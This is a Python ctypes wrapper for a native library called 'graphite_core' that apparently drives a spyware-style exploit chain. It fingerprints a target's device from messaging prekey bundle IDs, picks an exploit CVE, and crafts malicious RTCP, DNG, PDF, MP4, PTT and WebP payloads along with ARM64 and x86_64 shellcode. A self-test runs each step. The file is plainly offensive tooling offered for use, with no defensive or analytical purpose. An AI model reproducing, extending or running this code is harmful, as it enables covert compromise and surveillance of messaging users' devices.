#!/usr/bin/env python3
"""Thin Python wrapper for native graphite_core library.

Uses ctypes to call into the compiled C library (graphite_core.dll/so/dylib).
Minimizes Python usage - all core logic is in native C.
"""

import ctypes
import os
import sys
from pathlib import Path

# Load native library
_lib_path = Path(__file__).parent / "framework" / "cpp" / "bin"
if sys.platform == "win32":
    _lib = ctypes.CDLL(str(_lib_path / "graphite_core.dll"))
elif sys.platform == "darwin":
    _lib = ctypes.CDLL(str(_lib_path / "libgraphite.dylib"))
else:
    _lib = ctypes.CDLL(str(_lib_path / "libgraphite.so"))

# Define structures
class PrekeyBundle(ctypes.Structure):
    _fields_ = [
        ("signed_pk_id", ctypes.c_uint32),
        ("otpk_ids", ctypes.c_uint32 * 10),
        ("otpk_count", ctypes.c_int),
        ("platform_hint", ctypes.c_int),
        ("ios_version", ctypes.c_int),
    ]

class FingerprintResult(ctypes.Structure):
    _fields_ = [
        ("platform", ctypes.c_int),
        ("confidence", ctypes.c_int),
        ("exploit_cve", ctypes.c_char * 32),
    ]

# Function signatures
_lib.graphite_fingerprint.restype = FingerprintResult
_lib.graphite_fingerprint.argtypes = [ctypes.POINTER(PrekeyBundle)]

_lib.graphite_craft_rtcp.restype = ctypes.c_size_t
_lib.graphite_craft_rtcp.argtypes = [ctypes.POINTER(ctypes.c_uint8), ctypes.c_size_t, ctypes.c_uint32]

_lib.graphite_craft_dng.restype = ctypes.c_size_t
_lib.graphite_craft_dng.argtypes = [ctypes.POINTER(ctypes.c_uint8), ctypes.c_size_t]

_lib.graphite_craft_pdf.restype = ctypes.c_size_t
_lib.graphite_craft_pdf.argtypes = [ctypes.POINTER(ctypes.c_uint8), ctypes.c_size_t]

_lib.graphite_craft_mp4.restype = ctypes.c_size_t
_lib.graphite_craft_mp4.argtypes = [ctypes.POINTER(ctypes.c_uint8), ctypes.c_size_t]

_lib.graphite_craft_ptt.restype = ctypes.c_size_t
_lib.graphite_craft_ptt.argtypes = [ctypes.POINTER(ctypes.c_uint8), ctypes.c_size_t]

_lib.graphite_craft_webp.restype = ctypes.c_size_t
_lib.graphite_craft_webp.argtypes = [ctypes.POINTER(ctypes.c_uint8), ctypes.c_size_t]

_lib.graphite_shellcode_arm64.restype = ctypes.c_size_t
_lib.graphite_shellcode_arm64.argtypes = [ctypes.POINTER(ctypes.c_uint8), ctypes.c_size_t]

_lib.graphite_shellcode_x86_64.restype = ctypes.c_size_t
_lib.graphite_shellcode_x86_64.argtypes = [ctypes.POINTER(ctypes.c_uint8), ctypes.c_size_t]

_lib.graphite_platform_name.restype = ctypes.c_char_p
_lib.graphite_platform_name.argtypes = [ctypes.c_int]

_lib.graphite_is_ios_range.restype = ctypes.c_int
_lib.graphite_is_ios_range.argtypes = [ctypes.c_uint32]


def fingerprint(signed_pk_id, otpk_ids=None, platform_hint=0, ios_version=0):
    """Fingerprint device using native C library."""
    bundle = PrekeyBundle()
    bundle.signed_pk_id = signed_pk_id
    if otpk_ids:
        for i, oid in enumerate(otpk_ids[:10]):
            bundle.otpk_ids[i] = oid
        bundle.otpk_count = len(otpk_ids[:10])
    bundle.platform_hint = platform_hint
    bundle.ios_version = ios_version
    result = _lib.graphite_fingerprint(ctypes.byref(bundle))
    return {
        "platform": result.platform,
        "platform_name": _lib.graphite_platform_name(result.platform).decode(),
        "confidence": result.confidence,
        "exploit_cve": result.exploit_cve.decode(),
    }

def craft_rtcp(ssrc=0xDEADBEEF, size=8192):
    """Craft RTCP payload using native C library."""
    buf = (ctypes.c_uint8 * size)()
    n = _lib.graphite_craft_rtcp(buf, size, ssrc)
    return bytes(buf[:n])

def craft_dng(size=1024):
    """Craft DNG payload using native C library."""
    buf = (ctypes.c_uint8 * size)()
    n = _lib.graphite_craft_dng(buf, size)
    return bytes(buf[:n])

def craft_pdf(size=8192):
    """Craft PDF payload using native C library."""
    buf = (ctypes.c_uint8 * size)()
    n = _lib.graphite_craft_pdf(buf, size)
    return bytes(buf[:n])

def craft_mp4(size=1024):
    """Craft MP4 payload using native C library."""
    buf = (ctypes.c_uint8 * size)()
    n = _lib.graphite_craft_mp4(buf, size)
    return bytes(buf[:n])

def craft_ptt(size=1024):
    """Craft PTT payload using native C library."""
    buf = (ctypes.c_uint8 * size)()
    n = _lib.graphite_craft_ptt(buf, size)
    return bytes(buf[:n])

def craft_webp(size=1024):
    """Craft WEBP payload using native C library."""
    buf = (ctypes.c_uint8 * size)()
    n = _lib.graphite_craft_webp(buf, size)
    return bytes(buf[:n])

def shellcode_arm64():
    """Generate ARM64 shellcode using native C library."""
    buf = (ctypes.c_uint8 * 256)()
    n = _lib.graphite_shellcode_arm64(buf, 256)
    return bytes(buf[:n])

def shellcode_x86_64():
    """Generate x86_64 shellcode using native C library."""
    buf = (ctypes.c_uint8 * 256)()
    n = _lib.graphite_shellcode_x86_64(buf, 256)
    return bytes(buf[:n])

def is_ios_range(signed_pk_id):
    """Check if signed PK ID is in iOS range."""
    return bool(_lib.graphite_is_ios_range(signed_pk_id))


if __name__ == "__main__":
    # Test native library
    r = fingerprint(0x8437760, [8455555], platform_hint=2, ios_version=17)
    print(f"Fingerprint: {r['platform_name']} (conf {r['confidence']}%)")
    print(f"Exploit: {r['exploit_cve']}")

    rtcp = craft_rtcp()
    print(f"RTCP payload: {len(rtcp)} bytes")

    dng = craft_dng()
    print(f"DNG payload: {len(dng)} bytes, SOF3: {b'\xff\xc3' in dng}")

    pdf = craft_pdf()
    print(f"PDF payload: {len(pdf)} bytes")

    mp4 = craft_mp4()
    print(f"MP4 payload: {len(mp4)} bytes")

    sc_arm = shellcode_arm64()
    sc_x86 = shellcode_x86_64()
    print(f"Shellcode ARM64: {len(sc_arm)} bytes, x86_64: {len(sc_x86)} bytes")

    print("Native library OK")
